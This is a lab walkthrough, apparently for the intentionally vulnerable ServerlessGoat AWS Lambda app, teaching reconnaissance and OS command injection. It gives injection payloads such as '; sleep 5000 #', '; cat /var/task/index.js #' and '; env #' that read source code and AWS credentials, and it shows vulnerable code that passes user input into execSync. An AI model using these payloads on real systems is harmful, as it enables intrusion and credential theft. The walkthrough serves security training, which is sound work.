## ServerlessGoat: Lessons ##

### Lesson 1: Information Gathering ###
We begin our journey into serverless security by gathering some reconnaissance on the application. At first sight malicious users won't know that they are facing a serverless application.

#### Option 1 #### 
If the application is exposed through AWS API Gateway, the URL might have the following format:
https://{string}.execute-api.{region}.amazonaws.com/{stage}/...

#### Option 2 ####
If the application is exposed through AWS API Gateway, HTTP Response headers might contain header names such as: `x-amz-apigw-id`, `x-amzn-requestid`, `x-amzn-trace-id`

#### Option 3 ####
If the developer left unhandled exceptions and verbose error messages, these messages might contain sensitive information, which points to the fact that this is an AWS Lambda serverless application. Try to invoke the API of the convert form, using an HTTP get request, and without the `document_url` parameter in the Query string: ```https://eqfh35ixqj.execute-api.us-east-1.amazonaws.com/Prod/api/convert```

This will generate the following stack trace:
```
TypeError: Cannot read property 'document_url' of null
at log (/var/task/index.js:9:49)
at exports.handler (/var/task/index.js:25:11)
```
Looking at the stack trace, we see that the application is located in the /var/task directory, which is where AWS Lambda stores and executes your Lambda function. We also see `exports.handler`, which is a very common way to name serverless functions (i.e. the function name is `handler`, and it is defined inside `index.js`).

### Lesson 2: Reverse Engineering The Lambda Function ###
The next obvious step, is to try and gain access to the source code of the Lambda function, in order to reverse engineer and discover additional weaknesses. For this step, we will try to check whether the function is vulnerable to OS command injection.

We will blindly probe for OS command injection using a common time-based probing method - i.e. by invoking the sleep shell command.

In the URL field, enter the following value in the URL field: `https://www.puresec.io/hubfs/document.doc` - this will return the converted text. Now try the following: `https://www.puresec.io/hubfs/document.doc; sleep 1 #` and hit 'submit'. The function will run, albeit will return some garbled text. Next, we will try with a really long sleep value, which will force the function to hit the timeout configured: `https://www.puresec.io/hubfs/document.doc; sleep 5000 #`

Error message: ```{"message": "Internal server error"}```

Now we know that the application is vulnerable to OS command injection through the `document_url` parameter, and we can move on to extract its source code, by sending the following value in the URL field: `https://foobar; cat /var/task/index.js #`

This should return the source code of the function:
```
const child_process = require('child_process'); const AWS = require('aws-sdk'); const uuid = require('node-uuid'); async function log(event) { const docClient = new AWS.DynamoDB.DocumentClient(); let requestid = event.requestContext.requestId; let ip = event.requestContext.identity.sourceIp; let documentUrl = event.queryStringParameters.document_url; await docClient.put({ TableName: process.env.TABLE_NAME, Item: { 'id': requestid, 'ip': ip, 'document_url': documentUrl } } ).promise(); } exports.handler = async (event) => { try { await log(event); let documentUrl = event.queryStringParameters.document_url; let txt = child_process.execSync(`curl --silent -L ${documentUrl} | ./bin/catdoc -`).toString(); // Lambda response max size is 6MB. The workaround is to upload result to S3 and redirect user to the file. let key = uuid.v4(); let s3 = new AWS.S3(); await s3.putObject({ Bucket: process.env.BUCKET_NAME, Key: key, Body: txt, ContentType: 'text/html', ACL: 'public-read' }).promise(); return { statusCode: 302, headers: { "Location": `${process.env.BUCKET_URL}/${key}` } }; } catch (err) { return { statusCode: 500, body: err.stack }; } };
```

There's a lot to be learned from the source code:
* The application uses the AWS DynamoDB NoSQL database
* The application uses a Node.js package called node-uuid
* The application stores sensitive user information (IP address and document URL) inside the DynamoDB table, who's name is defined in the `TABLE_NAME` environment variable
* We see the cause for the OS command injection - using untrusted user input in the `child_process.execSync()` call
* The output of API invocations is stored inside an S3 bucket, which is also stored inside an environment variable - `BUCKET_URL`

### Lesson 3: Digging For Gold Inside Environment Variables ###
Let's grab the data from the environment variables by running the `env` command - in the URL field, type: `https://foobar; env #`

{Partial Values}
```
AWS_SESSION_TOKEN=XXXXXXXXXXXXX
TABLE_NAME={dynamo_table_name}
AWS_SECRET_ACCESS_KEY=XXXXXXXXXXXXX
BUCKET_NAME={bucket_name}
AWS_ACCESS_KEY_ID=XXXXXXXXXXXXX
```

To be continued...
